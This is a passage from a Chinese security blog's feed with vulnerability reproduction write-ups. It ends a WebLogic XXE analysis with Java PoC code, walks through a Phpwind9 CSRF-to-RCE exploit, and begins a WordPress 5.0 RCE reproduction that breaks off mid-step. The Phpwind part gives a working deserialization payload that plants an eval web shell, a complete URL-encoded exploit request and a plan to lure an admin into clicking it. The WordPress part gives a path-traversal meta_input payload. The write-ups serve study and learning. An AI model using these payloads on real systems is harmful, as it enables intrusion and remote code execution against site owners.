alt=""></p><p>可以看到<code>%dtd;%send;</code>被my.dtd里面的内容替换了。debug大致看了xml解析过程，中间有一个<code>EntityScanner</code>，会检测xml中的ENTITY，并且会判断是否加载了外部资源，如果加载了就外部资源加载进来，后面会将实体引用替换为实体申明的内容。也就是说，我们构造的反序列化数据中的xml数据，已经被解析过一次了，而需要的是没有被解析过的数据，让目标去解析。</p><p>所以我尝试修改了十六进制如下，使得xml修改成没有被解析的形式:</p><p><img src="../images/weblogic-xxe/14.png" alt=""></p><p>运行PoC测试下，</p><p><img src="../images/weblogic-xxe/15.png" alt=""></p><p><img src="../images/weblogic-xxe/16.png" alt=""></p><p><img src="../images/weblogic-xxe/17.png" alt=""></p><p>居然成功了，一开始以为反序列化生成的xml数据那块还会进行校验，不然反序列化不了，直接修改数据是不行的，没想到直接修改就可以了</p><h3 id="UnknownMsgHeader-漏洞点分析"><a href="#UnknownMsgHeader-漏洞点分析" class="headerlink" title="UnknownMsgHeader 漏洞点分析"></a>UnknownMsgHeader 漏洞点分析</h3><p>与<code>WsrmServerPayloadContext</code>差不多，PoC构造也是新建包然后替换，就不详细分析了，只说下类修改的地方与PoC构造</p><p>新建<code>UnknownMsgHeader</code>类，修改<code>writeExternal</code></p><p><img src="../images/weblogic-xxe/18.png" alt=""></p><p>PoC如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">images</span>/<span class="title">weblogic</span>-<span class="title">xxe2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Object instance = getXXEObject();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"xxe"</span>));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getXXEObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        QName qname = <span class="keyword">new</span> QName(<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>);</span><br><span class="line">        Element xmlHeader = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        UnknownMsgHeader umh = <span class="keyword">new</span> UnknownMsgHeader();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Field f1 = umh.getClass().getDeclaredField(<span class="string">"qname"</span>);</span><br><span class="line">            f1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            f1.set(umh, qname);</span><br><span class="line"></span><br><span class="line">            Field f2 = umh.getClass().getDeclaredField(<span class="string">"xmlHeader"</span>);</span><br><span class="line">            f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            f2.set(umh, xmlHeader);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> umh;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行PoC测试下(生成的步骤与第一个漏洞点一样)，使用T3协议脚本向WebLogic 7001端口发送序列化数据:</p><p><img src="../images/weblogic-xxe/16.png" alt=""></p><p><img src="../images/weblogic-xxe/20.png" alt=""></p><h3 id="WsrmSequenceContext-漏洞点分析"><a href="#WsrmSequenceContext-漏洞点分析" class="headerlink" title="WsrmSequenceContext 漏洞点分析"></a>WsrmSequenceContext 漏洞点分析</h3><p>这个类看似需要构造的东西挺多的，<code>readExternal</code>与<code>writeExternal</code>的逻辑也比前两个复杂些，但是PoC构造也很容易</p><p>新建<code>WsrmSequenceContext</code>类，修改</p><p><img src="../images/weblogic-xxe/19.png" alt=""></p><p>PoC如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">images</span>/<span class="title">weblogic</span>-<span class="title">xxe3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Object instance = getXXEObject();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"xxe"</span>));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getXXEObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        EndpointReference acksTo = <span class="keyword">new</span> EndpointReference();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        WsrmSequenceContext wsc = <span class="keyword">new</span> WsrmSequenceContext();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Field f1 = wsc.getClass().getDeclaredField(<span class="string">"acksTo"</span>);</span><br><span class="line">            f1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            f1.set(wsc, acksTo);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> wsc;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试下，使用T3协议脚本向WebLogic 7001端口发送序列化数据:</p><p><img src="../images/weblogic-xxe/16.png" alt=""></p><p><img src="../images/weblogic-xxe/21.png" alt=""></p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>好了，分析完成了。第一次分析Java的漏洞，还有很多不足的地方，但是分析的过程中也学到了很多，就算是一个看似很简单的点，如果不熟悉Java的一特性，会花费较长的时间去折腾。所以，一步一步走吧，不要太急躁，还有很多东西要学。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;当你觉得很累的时候，说明你正在走上坡路。&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;@xxlegend在他的&lt;a href=&quot;http://xxlegend.com/2019/04/19/weblogic%20CVE-2019-2647%E7%AD%89%E7%9B%B8%E5%85%B3XXE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;博客&lt;/a&gt;分析了其中的一个XXE漏洞点，并给出了PoC，作为入门级的Java新手，在大佬分析的基础上再分析很适合学习Java漏洞&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Oracle发布了4月份的补丁，详情见链接(&lt;a href=&quot;https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html#AppendixFMW&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html#AppendixFMW&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://longofo.cc/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="http://longofo.cc/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="代码审计" scheme="http://longofo.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Phpwind9-GET型CSRF任意代码执行漏洞复现与分析</title>
    <link href="http://longofo.cc/Phpwind9-GET%E5%9E%8BCSRF%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90.html"/>
    <id>http://longofo.cc/Phpwind9-GET型CSRF任意代码执行漏洞复现与分析.html</id>
    <published>2019-03-08T01:08:04.000Z</published>
    <updated>2019-03-08T06:19:30.126Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">总有一段路,需要一个人走,那就一个人,勇敢的走完</blockquote><blockquote><p>学习wooyun1000个代码审计案例,看到很有技巧性的漏洞跟踪学习下</p></blockquote><a id="more"></a><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h4><ul><li>Windows10</li><li>php5.6</li><li>phpwind9.0</li></ul><h4 id="漏洞要求"><a href="#漏洞要求" class="headerlink" title="漏洞要求"></a>漏洞要求</h4><ul><li>系统为windows</li><li>需要有访问后台<strong>任务中心</strong>权限</li></ul><h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><ul><li><p><strong>step1</strong> 生成反序列化poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// test.php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/plain"</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"test2.php"</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PwDelayRun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_callback;</span><br><span class="line">    <span class="keyword">private</span> $_args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_callback = [</span><br><span class="line">            <span class="string">'assert'</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_args = [</span><br><span class="line">            [<span class="string">"phpinfo() &amp;&amp; file_put_contents('shell.php','&lt;?php eval(\$_REQUEST[233]); ?&gt;');"</span>]</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> stdClass();</span><br><span class="line">$obj-&gt;a = <span class="keyword">new</span> src\library\utility\PwDelayRun();</span><br><span class="line">$obj-&gt;b = <span class="keyword">new</span> PwDelayRun();</span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($obj));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//test2.php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">src</span>\<span class="title">library</span>\<span class="title">utility</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PwDelayRun</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/phpwind-csrf-rce/1.png" alt=""></p></li><li><p><strong>step2</strong> 使用admin账户登陆,然后请求<code>http://127.0.0.1/phpwind9.0/admin.php?m=task&amp;c=TaskConditionMember&amp;a=profile&amp;var=O%3A8%3A%22stdClass%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A30%3A%22src%5Clibrary%5Cutility%5CPwDelayRun%22%3A0%3A%7B%7Ds%3A1%3A%22b%22%3BO%3A10%3A%22PwDelayRun%22%3A2%3A%7Bs%3A21%3A%22%00PwDelayRun%00_callback%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22assert%22%3B%7Ds%3A17%3A%22%00PwDelayRun%00_args%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A1%3A%7Bi%3A0%3Bs%3A79%3A%22phpinfo%28%29%3Bfile_put_contents%28%27shell.php%27%2C%27%3C%3Fphp+eval%28%24_REQUEST%5B233%5D%29%3B+%3F%3E%27%29%3Bexit%3B%22%3B%7D%7D%7D%7D</code></p><p>代码成功执行</p><p><img src="../images/phpwind-csrf-rce/2.png" alt=""></p><p>shell成功写入</p><p><img src="../images/phpwind-csrf-rce/3.png" alt=""></p></li></ul><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="全局搜索找到反序列化位置"><a href="#全局搜索找到反序列化位置" class="headerlink" title="全局搜索找到反序列化位置"></a>全局搜索找到反序列化位置</h4><p>漏洞位置一共三处:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/src/applications/admin/TaskConditionBbsController.php</span><br><span class="line">/src/applications/admin/TaskConditionMemberController.php</span><br><span class="line">/src/applications/admin/TaskRewardController.php</span><br></pre></td></tr></table></figure><p>这里使用<code>/src/applications/admin/TaskConditionMemberController.php</code></p><p><img src="../images/phpwind-csrf-rce/4.png" alt=""></p><p><code>$var = unserialize($this-&gt;getInput(&#39;var&#39;));</code><br>,从Input中获取var参数的值,进行反序列化。 这个Input可以来自<code>get/post/cookie</code>。只要在phpwind里找到反序列化可以利用的点,就能在这里触发反序列化漏洞。 </p><h4 id="全局搜索-destruct"><a href="#全局搜索-destruct" class="headerlink" title="全局搜索_destruct"></a>全局搜索<code>_destruct</code></h4><p>可以找到一个PwDelayRun类,其中遍历了<code>_callback</code>数组,用<code>call_user_func_array</code>执行任意函数。这里如果<code>_callback</code>可控,那么就可以直接执行assert+任意代码了。在<code>/src/applications/admin/TaskConditionMemberController.php</code>中,输入可以控制PwDelayRun类的序列化字符串,但是在执行反序列话之前必须定义了PwDelayRun类(也就是在此之前要包含过PwDelayRun所在的文件) </p><p>在<code>TaskConditionMemberController::beforeAction::unserialize</code>处下端点,并在之前输出当前所定义的所有类 </p><p><img src="../images/phpwind-csrf-rce/5.png" alt=""> </p><p>访问连接<code>http://127.0.0.1/phpwind9.0/admin.php?m=task&amp;c=TaskConditionMember&amp;a=profile&amp;var=</code> </p><p><img src="../images/phpwind-csrf-rce/6.png" alt=""> </p><p>可以看到在此之前没有定义过PwDelayRun类,那么即使反序列化也不会调用相关方法 </p><h4 id="spl-autoload包含任意php文件"><a href="#spl-autoload包含任意php文件" class="headerlink" title="spl_autoload包含任意php文件"></a>spl_autoload包含任意php文件</h4><p>为了包含PwDelayRun类,作者提到了使用<code>spl_autoloa</code>方法,就是说如果要使用的类不存在,会调用框架自己注册的autoload方法加载类。在phpwind9中,实现了autoload方法,并注册了 </p><p><img src="../images/phpwind-csrf-rce/7.png" alt=""> </p><p><img src="../images/phpwind-csrf-rce/8.png" alt=""> </p><p>但是这里className没有路径,PwDelayRun类在<code>src/library/utility/PwDelayRun.php</code>文件中,需要传入路径才可以包含到这个类。 虽然类名不能包含特殊字符,但类名中是可以包含<code>\</code>的,这是php中空间命名。命名空间中可以包含<code>\</code>,而在windows下,<code>\</code>也可以作为路径的分隔符,因此可以在payload中使用命名空间生成序列化字符串,在phpwind9中找不到类的时候,就会使用include包含。而包含时<code>\</code>只能在windows上使用,所以只限于windows系统。 </p><p>但是,这里将类名设置为<code>src\library\utility\PwDelayRun</code>,而 整个phpwind全局是没有使用命名空间的,也就是默认命名空间为<code>\</code>,但现在的PwDelayRun类所在的命名空间为<code>src\library\utility</code>。 这样,即使我包含了<code>src\library\utility\PwDelayRun.php</code>文件,反序列化的时候是实例化的<code>src\library\utility\PwDelayRun</code>类。但phpwind的命名空间是<code>\</code>,上下文存在的类是<code>\PwDelayRun</code>类,还是无法正常进行(得到的是一个不完整的类<code>__php_incomplete_class</code>,这是因为php反序列化一个对象,PHP无法找到原始类,所以PHP不知道,这个类是怎么样的): </p><p><img src="../images/phpwind-csrf-rce/9.png" alt=""> </p><p>只要生成<code>src\library\utility\PwDelayRun</code>类和<code>\PwDelayRun</code>类两个对象,放在一个数组中,在反序列化前者的过程中include目标文件,在反序列化后者的过程中拿到PwDelayRun对象</p><h4 id="利用数组-命名空间加载相同名字的类"><a href="#利用数组-命名空间加载相同名字的类" class="headerlink" title="利用数组+命名空间加载相同名字的类"></a>利用数组+命名空间加载相同名字的类</h4><p>生成<code>src\library\utility\PwDelayRun</code>类和<code>\PwDelayRun</code>类两个对象,放在一个数组中,在反序列化前者的过程中include目标文件,在反序列化后者的过程中拿到PwDelayRun对象。但是有个数组判断,</p><p><img src="../images/phpwind-csrf-rce/10.png" alt=""></p><p>这里如果反序列化后是个数组,就会保存到output中,导致变量不会在beforeAction结束时销毁,而是在脚本束时销毁。如果在结束时销毁,由于没有了上下文,poc中写文件那一步是写不进去的,除非文件路径给绝对给绝对路径,自己可以测试下。作者在分析中给了一个方法,就是用其他对象来替代数组,比如stdClass,</p><p>所以最后得到如下poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// test1.php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/plain"</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"test2.php"</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PwDelayRun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_callback;</span><br><span class="line">    <span class="keyword">private</span> $_args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_callback = [</span><br><span class="line">            <span class="string">'assert'</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_args = [</span><br><span class="line">            [<span class="string">"phpinfo() &amp;&amp; file_put_contents('shell.php','&lt;?php eval(\$_REQUEST[233]); ?&gt;')"</span>]</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> stdClass();</span><br><span class="line">$obj-&gt;a = <span class="keyword">new</span> src\library\utility\PwDelayRun();</span><br><span class="line">$obj-&gt;b = <span class="keyword">new</span> PwDelayRun();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($obj));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//test2.php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">src</span>\<span class="title">library</span>\<span class="title">utility</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PwDelayRun</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h4><p>由于上面的代码执行链接是get请求,不需要post中的csrftoken或其他验证,所以可以写个帖子,插入恶意链接,等待管理员点击。但是帖子中把&amp;编码了,导致请求不正常,不过可以增加一步跳转</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个漏洞很犀利和巧妙,所以自己跟踪与学习了下,加强自己的代码审计与分析能力,还有学到一些新技能：</p><ul><li>可以调用<code>get_declared_classes</code>查看当前执行所加载的所有自定义类</li><li>反序列化时,如果反序列化点之前没有加载过要反序列化的类,<code>spl_autoload</code>可能会很有帮助,查看框架是否使用了autoload</li><li>反序列化时,可以使用一种对象替代另一种对象绕过某些判断(比如用stdClass替代array)</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;总有一段路,需要一个人走,那就一个人,勇敢的走完&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;学习wooyun1000个代码审计案例,看到很有技巧性的漏洞跟踪学习下&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://longofo.cc/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="http://longofo.cc/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="代码审计" scheme="http://longofo.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>wordpress-5.0-rce-漏洞复现(从环境搭建到代码执行)</title>
    <link href="http://longofo.cc/wordpress-5.0-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(%E4%BB%8E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%88%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C).html"/>
    <id>http://longofo.cc/wordpress-5.0-rce-漏洞复现(从环境搭建到代码执行).html</id>
    <published>2019-03-03T05:27:39.000Z</published>
    <updated>2019-03-08T01:07:52.341Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote><blockquote><p>看了网上大佬们的分析，作为代码审计入门级别的我，看大佬分析都很吃力，很多地方看得稀里糊涂…所以决定动手跟踪下，看下到底怎么触发漏洞，也学习下大佬们的思路，积累些经验。参考了seebug paper <a href="https://paper.seebug.org/822/" title="seebugpaper" target="_blank" rel="noopener">seebugpaper</a>与绿盟的分析<a href="http://blog.nsfocus.net/wordpress-5-0-0-rce/" title="nsfocusblog" target="_blank" rel="noopener">nsfocusblog</a></p></blockquote><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看了网上大佬们的分析，作为代码审计入门级别的我，看大佬分析都很吃力，很多地方看得稀里糊涂…所以决定动手跟踪下，看下到底怎么触发漏洞，也学习下大佬们的思路，积累些经验。参考了seebug paper <a href="https://paper.seebug.org/822/" title="seebugpaper" target="_blank" rel="noopener">seebugpaper</a>与绿盟的分析<a href="http://blog.nsfocus.net/wordpress-5-0-0-rce/" title="nsfocusblog" target="_blank" rel="noopener">nsfocusblog</a></p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>windows 10</li><li>phpstudy (php-7.0.12-nts+Apache)</li><li>wordpress 5.0.0 （<strong>注：</strong> 官网的影响版本被修复了，自己去其他地方下载）</li><li>ImageMagick-6.9.3-Q16</li></ul><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ul><li><p><strong>step1</strong>  查看phpinfo参数</p><p><img src="../images/wordpress5.0-rce/1.png" alt=""></p><p>这几个参数和step2中ImageMagick和php-imagick扩展版本必须对应</p></li><li><p><strong>step2</strong> 下载对应ImageMagick和php-imagick扩展</p><ul><li><p>php-imagick扩展下载：<a href="http://pecl.php.net/package/imagick" title="imagick-dll" target="_blank" rel="noopener">php-imagick</a></p><p>比如我的是windows，php7.0 nts，vc14，x86，non safety，那么我选择如下</p><p><img src="../images/wordpress5.0-rce/2.png" alt=""></p></li><li><p>将下载的扩展包下的</p><p><img src="../images/wordpress5.0-rce/3.png" alt=""></p><p>将红色部分放到php安装目录（有php.ini）下，黄色部分放到安装目录的ext目录下</p></li><li><p>在php.ini中添加imagick扩展</p><p><img src="../images/wordpress5.0-rce/4.png" alt=""></p><p>修改配置后重启查看phpinfo</p><p><img src="../images/wordpress5.0-rce/5.png" alt=""></p><p>去imagemagick官网下载对应版本如上图我应该下载ImageMagick 6.9.3-7 Q16 x86，下载之后配置环境变量，配置好了可以使用convert命令查看是否安装好</p><p><img src="../images/wordpress5.0-rce/6.png" alt=""></p></li></ul></li><li><p><strong>step3</strong>  测试php-imagick能否正常工作与能不能远程加载图片</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$image = <span class="keyword">new</span> Imagick();</span><br><span class="line">$image-&gt;readImage(<span class="string">'http://bpic.588ku.com/element_origin_min_pic/19/03/01/5011d5b976536a8e0807d11da668db43.jpg'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果不能远程加载，那么修改下wordpress的<code>wp-includes/class-wp-image-editor-imagick.php</code>的153行:</p><p><img src="../images/wordpress5.0-rce/7.png" alt=""></p></li><li><p><strong>step4</strong> wordpress安装</p><p>wordpress安装就不说了，一路点击安装</p><p>安装完成后，使用管理员登陆，创建一个具有author权限的用户（利用此漏洞最低权限为author）</p></li></ul><h3 id="漏洞利用链"><a href="#漏洞利用链" class="headerlink" title="漏洞利用链"></a>漏洞利用链</h3><ul><li>通过post meta变量覆盖，将数据库中的图片的<code>_wp_attached_file</code>变量覆盖，这一步是为下一步写入图片马到目录做铺垫</li><li>通过图片裁剪功能，将裁剪后的图片写到我们设定的目录下</li><li>通过post meta变量覆盖，设置<code>_wp_page_template</code>，指定template为图片马</li><li>在模板加载时包含恶意裁剪的图片马</li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ul><li><p><strong>step1</strong> 制作一张图片马</p><p>我使用的MagickEXIF修改器<a href="http://www.magicexif.com/" title="magickexif" target="_blank" rel="noopener">MagickEXIF</a>修改图片的exif信息制作的图片马</p><p>使用方式是直接拖进MagickEXIF，修改图片exif信息就可以了</p><p><img src="../images/wordpress5.0-rce/8.png" alt=""></p></li><li><p><strong>step2</strong> 覆盖<code>_wp_attached_file变量</code></p><ul><li><p>上传setp1制作的图片马</p><p><img src="../images/wordpress5.0-rce/9.png" alt=""></p><p>此时查看wordpress数据库的<code>wp_postmeta</code>表，_wp_attached_file默认是图片上传所在路径（即<code>wp-content/uploads/2019/03</code>）</p><p><img src="../images/wordpress5.0-rce/10.png" alt=""></p></li><li><p>编辑图片信息并抓包</p><p><img src="../images/wordpress5.0-rce/11.png" alt=""></p><p>抓包</p><p><img src="../images/wordpress5.0-rce/12.png" alt=""></p><p>在repeater中修改包，添加如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;meta_input[_wp_attached_file]=2019/03/3-1.jpg#/../../../../themes/twentynineteen/shell.jpg</span><br></pre></td></tr></table></figure><p>注意<code>#</code>前半部分setp1图片上传所在路径，后半部分可以任意。使用repeater重新发包记得删掉<code>content-length</code></p><p><img src="../images/wordpress5.0-rce/13.png" alt=""></p></li><li><p>查看<code>wp_postmeta</code>表，<code>_wp_attached_file</code>已经被覆盖</p><p><img src="../images/wordpress5.0-rce/14.png" alt=""></p></li></ul></li><li><p><strong>step3</strong> 裁剪图片，将裁剪后的图片写到任意目录下（我上面的路径为<code>wp-content/themes/twentynineteen/shell.jpg</code>）</p><p><img src="../images/wordpress5.0-rce/15.png" alt=""></p><p>抓包</p><p><img src="../images/wordpress5.0-rce/16.png" alt=""></p><p>在repeater中，将post数据修改为如下（记得删除content-length，数据包中的_ajax_nonce为你数据包中的nonce，id你数据包 中的postid）:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 